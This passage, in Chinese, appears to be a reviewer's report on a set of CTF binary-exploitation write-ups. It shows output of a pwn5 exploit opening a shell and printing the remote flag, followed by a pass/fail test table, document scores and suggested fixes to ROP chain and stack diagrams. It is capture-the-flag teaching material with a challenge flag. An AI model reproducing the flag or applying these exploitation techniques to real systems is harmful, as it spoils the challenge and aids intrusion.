>>> pwn5  (port 26008)
[+] shell should be up, sending commands
sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
…（略）
FLAG: sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
```
**→ PASS**。README 的 port 表、flag 表、保護機制表我都逐項對過（見 §0 第 17 項），只有檔案結構樹是錯的。

### 4.8 總結

| 測試 | 結果 | 證據 |
|---|---|---|
| pwn5 local ×3 | **PASS** | `sun{LOCAL_DUMMY_FLAG}` |
| pwn5 REMOTE ×3 | **PASS** | `sun{the_future_is_now_today_well_wait_how_are_you_reading_this}` |
| pwn5 gdb 證據重跑 | **PASS** | 與 notes §5.3 逐字相同 |
| pwn5 對齊實測 | **PASS** | `system@plt` 入口 `rsp&0xf=8` |
| `run_all.sh pwn5` | **PASS** | 真 flag |
| `wp/00` 指令（除安裝與 DEBUG 外） | **PASS** | 見 §4.5 |
| `wp/00` `pip install…` | **FAIL** | PEP 668 |
| `wp/00` `DEBUG=1 python3 exploit.py` | **FAIL** | log_level 仍是 info |
| `wp/00` `b *main+42`（stripped） | **FAIL** | `No symbol table is loaded.` |
| `pwn5/notes.md` §7.1 的 chain 圖 | **FAIL** | 與實測/GDB 差一格（P0-1） |
| `wp/00` §6.3 的堆疊圖 | **FAIL** | buf/canary 顛倒（P0-2） |
| `wp/README.md` 檔案樹 | **FAIL** | 層級錯 + 2 個不存在的檔案（P0-5） |

**注意：`pwn5/exploit.py` 本身沒有任何問題，`notes.md` 的技術核心（漏洞、offset、gadget、對齊、
CRC 反解、libc-free 策略）全部經我獨立複驗為正確。**

---

## 5. 評分與最有價值的改進

### 分數

| 文件 | 分數 | 理由 |
|---|---|---|
| **`wp/00_基礎知識_從零開始.md`** | **7 / 10** | 教學順序（暫存器→指令→呼叫約定→堆疊→syscall→PLT/GOT→漏洞→ROP→SROP）**完全正確**，術語幾乎都有定義，round 1 的 5 項修正在這一輪全部查證為正確套用。扣分：**安裝指令在本檔自己指定的 Arch 上會失敗**（P0-3）、**§6.3 的堆疊圖 buf/canary 顛倒**（P0-2，會直接教出錯的 offset 心智模型）、**`DEBUG=1` 無效**（P0-4）、**沒有 libc base + offset 的教學**（P1-5）、**pwn6 相關三處指錯**（P1-2/3）、以及缺一張「誰吃掉哪一格」的實測表。（round 1 給整份 write-up 6 分；`wp/00` 單獨看，因為 §10.4 的對齊教學、§11 的 SROP 推導、§1 的名詞表都做得很紮實，給 7 分。） |
| **`wp/99_速查表.md`** | **8 / 10** | 身為速查表**真的可用**：保護表、暫存器表、syscall 表、gadget 表、ROP/SROP/fmtstr/heap 四個模板、pwntools 一行、gdb、上線檢查清單都在一頁內。round 1 的 E6（chunk 佈局）與 E10（冒號）都已正確修好，我實測的每一行也都可執行。扣分：SROP 模板三個關鍵處（`frame.rsp`、`SYSCALL_RET`、`__NR_rt_sigreturn`）說明不足、§1 缺 Partial RELRO 列、§10 gdb 沒提醒 PIE 位址問題、`_IO_2_1_stdout_`/`environ` 未定義。 |
| （附加）`pwn5/notes.md` | **8.5 / 10** | 全篇少見的高水準：漏洞推導到 byte 級、gadget 藏在立即值裡、CRC 反解（雙射／唯一解）、libc-free ROP 策略、可重跑的 gdb 證據腳本 —— 我獨立複驗**每一條關鍵宣告都成立**，exploit local/remote 都真的能跑。扣分只在 §7.1 的圖（P0-1）與 §11 #1 的 PTY 神話（P1-1）這兩處「解釋錯但結論對」的地方。 |
| （附加）`wp/README.md` | **6.5 / 10** | 表格資料（port / 保護 / flag / 技巧）**逐項查證全對**，閱讀順序也對。但檔案結構樹層級畫錯、列了 `review_round2.md`/`review_round3.md` 兩個不存在的檔案、漏列 `00_recon.md`；對新手來說「照著樹找檔案卻找不到」是直接的卡點。 |

### 最有價值的 3 個改進（照這個順序做）

1. **修 `pwn5/notes.md` §7.1 的 chain 圖（P0-1），並補上「誰吃掉哪一格」的實測 `rsp` 表（B2-1）。**
   這是本輪唯一一個「照著做會壞掉」的技術示意圖：圖上多插了一格對齊用 `ret`，
   照排會讓 `system` 入口 `rsp%16==0` → `movaps` SIGSEGV，而且錯誤訊息完全指不到原因
   ——正好踩在本題自己在教的對齊陷阱上。順手把 §7.1 下方那張「每一步 `rsp` 在哪」的表補進去，
   新手就會從「背 offset」升級成「知道堆疊在幹嘛」。（實測數字都已在 §4.4 取得，可直接貼。）

2. **修 `wp/00` §6.3 的堆疊圖（P0-2）＋補「canary 的 offset 怎麼算」＋補一節「libc base + offset」（P1-5）。**
   這三件事是同一個洞：「基底 + 位移」這個唯一的核心概念，`wp/00` 只講了 PIE 那一半，
   而唯一示範 offset 的圖又把 `buf` 和 `canary` 畫反。
   修完之後，pwn1/pwn5/pwn6 的 `state[i]`、`buf+0x80`、`buf+0x48` 就全部接得上了。

3. **修「第一次照著打就會失敗」的四個地方：PEP 668 安裝（P0-3）、`DEBUG=1`（P0-4）、
   README 的檔案樹（P0-5）、pwn5 的執行目錄說明（P1-7）。**
   這四項都不是知識錯誤，但都發生在「新手還沒建立信心之前」，殺傷力最大：
   指令貼上去跳出紅字、照著樹找檔案找不到、在錯的目錄執行看到 `does not exist`、
   以為開了的除錯模式其實沒開。全部都是**一行文字就能修好**的高投報率修改。
